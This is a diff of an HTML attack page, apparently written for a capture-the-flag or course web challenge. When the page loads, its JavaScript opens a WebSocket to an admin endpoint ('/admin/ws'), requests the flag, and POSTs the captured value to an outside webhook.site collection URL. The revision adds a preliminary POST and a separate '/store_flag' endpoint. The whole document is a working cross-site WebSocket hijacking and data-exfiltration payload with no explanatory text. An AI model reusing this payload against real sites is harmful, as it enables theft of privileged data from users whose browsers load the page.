@@ -3,64 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retrieve and Send Simple POST</title>
+    <title>WebSocket and POST Request</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
-            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a';
+            const wsUrl = 'ws://hw2-3-web:8081/admin/ws';
+            const firstWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
+            const secondWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';
 
-            // Open WebSocket connection
-            console.log('Opening WebSocket connection...');
-            const ws = new WebSocket(wsUrl);
+            // Step 1: Send a POST request to the first webhook
+            console.log('Sending initial POST request...');
+            fetch(firstWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ message: 'Initial POST request sent' }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Initial POST request sent successfully');
+                    
+                    // Step 2: Open WebSocket connection after the first POST is complete
+                    console.log('Opening WebSocket connection...');
+                    const ws = new WebSocket(wsUrl);
 
-            ws.onopen = () => {
-                console.log('WebSocket connection opened');
-                ws.send('flag'); // Request the flag
-            };
+                    ws.onopen = () => {
+                        console.log('WebSocket connection opened');
+                        ws.send('flag'); // Request the flag
+                    };
 
-            ws.onmessage = (event) => {
-                console.log('Received WebSocket message:', event.data);
+                    ws.onmessage = (event) => {
+                        console.log('Received WebSocket message:', event.data);
+                        if (event.data.includes('flag{')) {
+                            const flag = event.data;
+                            console.log('Flag received:', flag);
 
-                if (event.data.includes('flag{')) {
-                    const flag = event.data;
-                    console.log('Flag received:', flag);
-
-                    // Send a simple POST request to the webhook
-                    console.log('Sending simple POST to the webhook...');
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ message: 'POST request sent successfully' }),
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('POST request sent successfully');
+                            // Step 3: Send the flag to the second webhook
+                            console.log('Sending flag to the second webhook...');
+                            fetch(secondWebhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({ flag }),
+                            })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Flag sent successfully to the second webhook');
+                                } else {
+                                    console.error('Failed to send flag to the second webhook. Response status:', response.status);
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error sending flag to the second webhook:', error);
+                            });
                         } else {
-                            console.error('Failed to send POST. Response status:', response.status);
+                            console.warn('WebSocket message did not contain a flag:', event.data);
                         }
-                    })
-                    .catch(error => {
-                        console.error('Error sending POST:', error);
-                    });
+                    };
+
+                    ws.onerror = (error) => {
+                        console.error('WebSocket error:', error);
+                    };
+
+                    ws.onclose = () => {
+                        console.log('WebSocket connection closed');
+                    };
                 } else {
-                    console.warn('No valid flag found in the WebSocket message');
+                    console.error('Failed to send the initial POST request. Response status:', response.status);
                 }
-            };
-
-            ws.onerror = (error) => {
-                console.error('WebSocket error:', error);
-            };
-
-            ws.onclose = () => {
-                console.log('WebSocket connection closed');
-            };
+            })
+            .catch(error => {
+                console.error('Error sending initial POST request:', error);
+            });
         });
     </script>
 </head>
 <body>
-    <h1>Retrieve and Send Simple POST</h1>
-    <p>The flag will be retrieved, and a simple POST request will be sent to the webhook when the page loads. Check the console for details.</p>
+    <h1>WebSocket and POST Request</h1>
+    <p>The flag will be retrieved and sent automatically after the first POST request is completed.</p>
 </body>
 </html>
